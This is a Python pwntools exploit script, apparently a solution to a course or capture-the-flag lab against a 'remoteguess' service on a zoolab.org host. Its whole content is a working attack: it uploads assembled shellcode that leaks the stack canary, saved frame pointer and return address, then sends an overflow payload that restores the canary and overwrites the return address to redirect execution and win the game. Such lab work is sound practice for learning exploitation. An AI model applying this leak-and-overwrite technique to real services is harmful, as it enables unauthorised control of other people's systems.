#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1];

shellcode = """
solver:
    push rbp
    mov rbp, rsp
    sub rsp, 0x10

    mov rax, QWORD PTR fs:0x28
    mov QWORD PTR [rbp-0x8], rax

    mov rax, 0x1
    mov rdi, 1
    lea rsi, [rbp-0x8]
    mov rdx, 0x18

    syscall

    mov rsp, rbp
    pop rbp
    ret
"""

shellcode_bytes = asm(shellcode)
# print(len(shellcode_bytes))

# payload = None
# if os.path.exists(exe):
#     with open(exe, 'rb') as f:
#         payload = f.read()

# r = process("./remoteguess", shell=True)
# r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)


ef = ELF(exe)
print("** {} bytes to submit, solver found at {:x}".format(len(shellcode_bytes), 0))
r.sendlineafter(b'send to me? ', str(len(shellcode_bytes)).encode())
r.sendlineafter(b'to call? ', str(0).encode())
r.sendafter(b'bytes): ', shellcode_bytes)

buf = r.recvuntil(b'done.\n')

start = buf.find(b'received.\n')
end = buf.find(b'** Function')
data = buf[start + len(b'received.\n'): end]

print(data)

canary = data[0:8]
rbp = data[8:16]
ra = data[16:24]

new_ra = (int.from_bytes(ra, byteorder='little') + 0xab).to_bytes(length=8, byteorder='little')

guessNum = 0


r.sendafter(b'Show me your answer?', str(guessNum).encode('ascii').ljust(24,b'\0') 
            + canary + rbp + new_ra.ljust(20,b'\0')+ p32(guessNum))

response = r.recvall()
print(response.decode())


# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :